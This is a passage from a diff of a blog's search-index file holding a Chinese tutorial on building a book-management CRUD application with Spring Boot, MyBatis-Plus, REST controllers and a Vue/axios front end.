+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">update</span><span class="hljs-params">(Book book)</span> </span>&#123;
+        <span class="hljs-keyword">return</span> bookDao.updateById(book) &gt; <span class="hljs-number">0</span>;
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">delete</span><span class="hljs-params">(Integer id)</span> </span>&#123;
+        <span class="hljs-keyword">return</span> bookDao.deleteById(id) &gt; <span class="hljs-number">0</span>;
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Book&gt; <span class="hljs-title">getAll</span><span class="hljs-params">()</span> </span>&#123;
+        <span class="hljs-keyword">return</span> bookDao.selectList(<span class="hljs-keyword">null</span>);
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> Book <span class="hljs-title">getById</span><span class="hljs-params">(Integer id)</span> </span>&#123;
+        <span class="hljs-keyword">return</span> bookDao.selectById(id);
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> IPage&lt;Book&gt; <span class="hljs-title">getPage</span><span class="hljs-params">(<span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span> </span>&#123;
+        IPage&lt;Book&gt; page = <span class="hljs-keyword">new</span> Page&lt;&gt;(currentPage, pageSize);
+        <span class="hljs-keyword">return</span> bookDao.selectPage(page, <span class="hljs-keyword">null</span>);
+    &#125;
+&#125;
+</code></pre>
+
+<p>使用mybatisplus的自带接口快速开发</p>
+<p>业务层接口快速开发</p>
+<pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IBookService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">IService</span>&lt;<span class="hljs-title">Book</span>&gt; </span>&#123;
+    <span class="hljs-comment">//添加非通用操作API接口</span>
+&#125;</code></pre>
+
+<p>​        业务层接口实现类快速开发，关注继承的类需要传入两个泛型，一个是数据层接口，另一个是实体类。</p>
+<pre><code class="hljs JAVA"><span class="hljs-meta">@Service</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookServiceImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ServiceImpl</span>&lt;<span class="hljs-title">BookDao</span>, <span class="hljs-title">Book</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">IBookService</span> </span>&#123;
+    <span class="hljs-meta">@Autowired</span>
+    <span class="hljs-keyword">private</span> BookDao bookDao;
+	<span class="hljs-comment">//添加非通用操作API</span>
+&#125;</code></pre>
+
+<p>​        如果感觉MyBatisPlus提供的功能不足以支撑你的使用需要（其实是一定不能支撑的，因为需求不可能是通用的），在原始接口基础上接着定义新的API接口就行了，此处不再说太多了，就是自定义自己的操作了，但是不要和已有的API接口名冲突即可。</p>
+<p><strong>总结</strong></p>
+<ol>
+<li>使用通用接口（ISerivce<T>）快速开发Service</T></li>
+<li>使用通用实现类（ServiceImpl&lt;M,T&gt;）快速开发ServiceImpl</li>
+<li>可以在通用接口基础上做功能重载或功能追加</li>
+<li>注意重载时不要覆盖原始操作，避免原始提供的功能丢失</li>
+</ol>
+<h3 id="表现层开发"><a href="#表现层开发" class="headerlink" title="表现层开发"></a>表现层开发</h3><p>表现层接口如下：</p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.controller;
+
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
+<span class="hljs-keyword">import</span> com.sunzy.domain.Book;
+<span class="hljs-keyword">import</span> com.sunzy.service.IBookService;
+<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
+<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;
+<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;
+<span class="hljs-keyword">import</span> java.util.List;
+
+<span class="hljs-comment">//使用restful接口约束</span>
+<span class="hljs-meta">@RestController</span>
+<span class="hljs-meta">@RequestMapping(&quot;/books&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookController2</span> </span>&#123;
+
+    <span class="hljs-meta">@Autowired</span>
+    <span class="hljs-keyword">private</span> IBookService service;
+
+    <span class="hljs-meta">@GetMapping</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Book&gt; <span class="hljs-title">getAll</span><span class="hljs-params">()</span></span>&#123;
+        <span class="hljs-keyword">return</span> service.list();
+    &#125;
+
+
+    <span class="hljs-meta">@PostMapping</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">save</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;
+
+        System.out.println(book);
+        <span class="hljs-keyword">return</span> service.save(book);
+    &#125;
+
+    <span class="hljs-meta">@PutMapping</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;
+        LambdaQueryWrapper&lt;Book&gt; wrapper = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;&gt;();
+        wrapper.eq(Book::getId, book.getId());
+        <span class="hljs-keyword">return</span> service.update(book,wrapper);
+    &#125;
+
+    <span class="hljs-meta">@DeleteMapping(&quot;&#123;id&#125;&quot;)</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id)</span></span>&#123;
+        <span class="hljs-keyword">return</span> service.removeById(id);
+    &#125;
+
+    <span class="hljs-meta">@GetMapping(&quot;&#123;id&#125;&quot;)</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> Book <span class="hljs-title">getById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id )</span></span>&#123;
+        <span class="hljs-keyword">return</span> service.getById(id);
+    &#125;
+
+    <span class="hljs-meta">@GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> IPage&lt;Book&gt; <span class="hljs-title">getPage</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> currentPage, <span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> pageSize)</span></span>&#123;
+        Page&lt;Book&gt; page = <span class="hljs-keyword">new</span> Page&lt;&gt;(currentPage, pageSize);
+        <span class="hljs-keyword">return</span> service.page(page);
+    &#125;
+&#125;</code></pre>
+
+<p>使用postman测试各个接口是否可以正常工作</p>
+<p>getById功能</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231257883.png" alt="image-20220418231257883"></p>
+<p>分页功能</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231337888.png" alt="image-20220418231337888"></p>
+<p>save()功能</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231557326.png" alt="image-20220418231557326"></p>
+<p>删除功能delete()</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418232140801.png" alt="image-20220418232140801"></p>
+<p>==消息一致性处理== </p>
+<pre><code class="hljs java"><span class="hljs-meta">@Data</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span> </span>&#123;
+    <span class="hljs-keyword">private</span> Boolean flag;   <span class="hljs-comment">//表示本次请求是否成功</span>
+    <span class="hljs-keyword">private</span> Object data;    <span class="hljs-comment">//本次请求返回的数据</span>
+&#125;</code></pre>
+
+<p>使用消息一致处理后获取的数据格式</p>
+<pre><code class="hljs java">&#123;
+    <span class="hljs-string">&quot;flag&quot;</span>: <span class="hljs-keyword">true</span>,
+    <span class="hljs-string">&quot;data&quot;</span>:&#123;
+        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,
+        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;计算机理论&quot;</span>,
+        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Spring实战 第5版&quot;</span>,
+        <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;Spring入门经典教程&quot;</span>
+    &#125;
+&#125;</code></pre>
+
+<p>修改表现层代码</p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.controller;
+
+
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
+<span class="hljs-keyword">import</span> com.sunzy.controller.utils.R;
+<span class="hljs-keyword">import</span> com.sunzy.domain.Book;
+<span class="hljs-keyword">import</span> com.sunzy.service.IBookService;
+<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
+<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;
+
+<span class="hljs-keyword">import</span> java.util.List;
+
+<span class="hljs-meta">@RestController</span>
+<span class="hljs-meta">@RequestMapping(&quot;/books&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookController</span> </span>&#123;
+
+    <span class="hljs-meta">@Autowired</span>
+    <span class="hljs-keyword">private</span> IBookService service;
+
+    <span class="hljs-meta">@GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">getAll</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> currentPage, <span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> pageSize, Book book)</span></span>&#123;
+        IPage&lt;Book&gt; bookIPage = service.getAll(currentPage, pageSize, book);
+        <span class="hljs-keyword">if</span>(currentPage &gt; bookIPage.getPages()) &#123;
+            bookIPage = service.getAll((<span class="hljs-keyword">int</span>) bookIPage.getPages(), pageSize, book);
+        &#125;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(<span class="hljs-keyword">null</span> != bookIPage, bookIPage);
+    &#125;
+
+
+    <span class="hljs-meta">@PostMapping</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">save</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(service.save(book));
+    &#125;
+
+    <span class="hljs-meta">@PutMapping</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;
+        LambdaQueryWrapper&lt;Book&gt; wrapper = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;&gt;();
+        wrapper.eq(Book::getId, book.getId());
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(service.update(book,wrapper));
+    &#125;
+
+    <span class="hljs-meta">@DeleteMapping(&quot;&#123;id&#125;&quot;)</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id)</span></span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(service.removeById(id));
+    &#125;
+
+    <span class="hljs-meta">@GetMapping(&quot;&#123;id&#125;&quot;)</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">getById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id )</span></span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(<span class="hljs-keyword">true</span>, service.getById(id));
+    &#125;
+
+<span class="hljs-comment">//    @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span>
+<span class="hljs-comment">//    public R getPage(@PathVariable int currentPage, @PathVariable int pageSize)&#123;</span>
+<span class="hljs-comment">//        Page&lt;Book&gt; ipage = new Page&lt;&gt;(currentPage, pageSize);</span>
+<span class="hljs-comment">//        Page&lt;Book&gt; page = service.page(ipage);</span>
+<span class="hljs-comment">//</span>
+<span class="hljs-comment">//        if(currentPage &gt; page.getCurrent())&#123;</span>
+<span class="hljs-comment">//            ipage.setCurrent(page.getPages());</span>
+<span class="hljs-comment">//            page = service.page(ipage);</span>
+<span class="hljs-comment">//        &#125;</span>
+<span class="hljs-comment">//        return new R(true, page);</span>
+<span class="hljs-comment">//    &#125;</span>
+&#125;
+</code></pre>
+
+<h3 id="前端页面代码"><a href="#前端页面代码" class="headerlink" title="前端页面代码"></a>前端页面代码</h3><h4 id="分页查询所有数据和条件查询"><a href="#分页查询所有数据和条件查询" class="headerlink" title="分页查询所有数据和条件查询"></a>分页查询所有数据和条件查询</h4><p>页面数据模型定义</p>
+<pre><code class="hljs java">data:&#123;
+	dataList: [],              <span class="hljs-comment">//当前页要展示的列表数据</span>
+	pagination: &#123;              <span class="hljs-comment">//分页相关模型数据</span>
+                currentPage: <span class="hljs-number">1</span>,<span class="hljs-comment">//当前页码</span>
+                pageSize:<span class="hljs-number">10</span>,   <span class="hljs-comment">//每页显示的记录数</span>
+                total:<span class="hljs-number">0</span>,       <span class="hljs-comment">//总记录数</span>
+                name:<span class="hljs-string">&#x27;&#x27;</span>,
+                type:<span class="hljs-string">&#x27;&#x27;</span>,
+                description:<span class="hljs-string">&#x27;&#x27;</span>
+    &#125;
+&#125;</code></pre>
+
+<p>异步请求代码</p>
+<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">getAll</span>(<span class="hljs-params"></span>)</span> &#123;
+    param = <span class="hljs-string">&quot;?name=&quot;</span> + <span class="hljs-built_in">this</span>.pagination.name;
+    param = param + <span class="hljs-string">&quot;&amp;type=&quot;</span> + <span class="hljs-built_in">this</span>.pagination.type;
+    param = param + <span class="hljs-string">&quot;&amp;description=&quot;</span> + <span class="hljs-built_in">this</span>.pagination.description;
+
+    <span class="hljs-comment">// console.log(param);</span>
+    axios.get(<span class="hljs-string">&quot;/books/&quot;</span>+<span class="hljs-built_in">this</span>.pagination.currentPage + <span class="hljs-string">&quot;/&quot;</span> + <span class="hljs-built_in">this</span>.pagination.pageSize + param).then(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>&#123;
+        <span class="hljs-built_in">this</span>.dataList = res.data.data.records;
+        <span class="hljs-built_in">this</span>.pagination.total = res.data.data.total;
+        <span class="hljs-built_in">this</span>.pagination.currentPage = res.data.data.current;
+        <span class="hljs-built_in">this</span>.pagination.pagesize = res.data.data.size;
+    &#125;);
+&#125;</code></pre>
+
+<p>在钩子函数中执行该方法</p>
+<pre><code class="hljs java"><span class="hljs-comment">//钩子函数，VUE对象初始化完成后自动执行</span>
+created() &#123;
+    <span class="hljs-keyword">this</span>.getAll();
+&#125;,</code></pre>
+
+<h4 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h4><p>添加数据的窗口弹出控制</p>
+<p>数据模型</p>
+<pre><code class="hljs js">dialogFormVisible: <span class="hljs-literal">false</span>,<span class="hljs-comment">//添加表单是否可见</span>
+formData</code></pre>
+
+<p>对话框控制函数</p>
+<pre><code class="hljs java"><span class="hljs-comment">//弹出添加窗口</span>
+handleCreate() &#123;
+    <span class="hljs-keyword">this</span>.dialogFormVisible = <span class="hljs-keyword">true</span>;
+    <span class="hljs-keyword">this</span>.resetForm();
+&#125;,</code></pre>
+
+<p>重置表单功能</p>
+<pre><code class="hljs java"><span class="hljs-comment">//重置表单</span>
+resetForm() &#123;
+    <span class="hljs-keyword">this</span>.formData = &#123;&#125;;
+&#125;,</code></pre>
+
+<p>添加功能</p>
+<pre><code class="hljs java">handleAdd () &#123;
+    axios.post(<span class="hljs-string">&quot;/books&quot;</span>, <span class="hljs-keyword">this</span>.formData).then((res) =&gt; &#123;
+        <span class="hljs-keyword">if</span>(res.data.flag)&#123;
+            <span class="hljs-keyword">this</span>.dialogFormVisible = <span class="hljs-keyword">false</span>;
+            <span class="hljs-keyword">this</span>.$message.success(<span class="hljs-string">&quot;添加成功！&quot;</span>);
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">this</span>.$message.error(<span class="hljs-string">&quot;添加失败！&quot;</span>);
+        &#125;
+    &#125;).<span class="hljs-keyword">finally</span>(() =&gt; &#123;
+        <span class="hljs-keyword">this</span>.getAll();
+    &#125;)
+&#125;</code></pre>
+
+<h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><pre><code class="hljs java"><span class="hljs-comment">// 删除</span>
+handleDelete(row) &#123;
+    axios.delete(<span class="hljs-string">&quot;/books/&quot;</span> + row.id).then((res)=&gt;&#123;
+        <span class="hljs-keyword">if</span>(res.data.flag)&#123;
+            <span class="hljs-keyword">this</span>.$message.success(<span class="hljs-string">&quot;删除成功！&quot;</span>);
+            <span class="hljs-keyword">this</span>.getAll();
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">this</span>.$message.error(<span class="hljs-string">&quot;删除失败！&quot;</span>);
+        &#125;
+    &#125;)
+&#125;,</code></pre>
+
+<h4 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h4><pre><code class="hljs java"><span class="hljs-comment">//弹出编辑窗口</span>
+handleUpdate(row) &#123;
+    <span class="hljs-keyword">this</span>.dialogFormVisible4Edit = <span class="hljs-keyword">true</span>;
+    <span class="hljs-keyword">this</span>.formData = row;
+&#125;,
+
+<span class="hljs-comment">//修改</span>
+handleEdit() &#123;
+    axios.put(<span class="hljs-string">&quot;/books&quot;</span>, <span class="hljs-keyword">this</span>.formData).then((res) =&gt; &#123;
+        <span class="hljs-keyword">if</span>(res.data.flag)&#123;
+            <span class="hljs-keyword">this</span>.dialogFormVisible4Edit = <span class="hljs-keyword">false</span>;
+            <span class="hljs-keyword">this</span>.$message.success(<span class="hljs-string">&quot;修改成功！&quot;</span>);
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">this</span>.$message.error(<span class="hljs-string">&quot;修改失败！&quot;</span>);
+        &#125;
+    &#125;).<span class="hljs-keyword">finally</span>(() =&gt; &#123;
+        <span class="hljs-keyword">this</span>.getAll();
+    &#125;)
+&#125;,</code></pre>
+
+]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>springboot</tag>
       </tags>
   </entry>
   <entry>
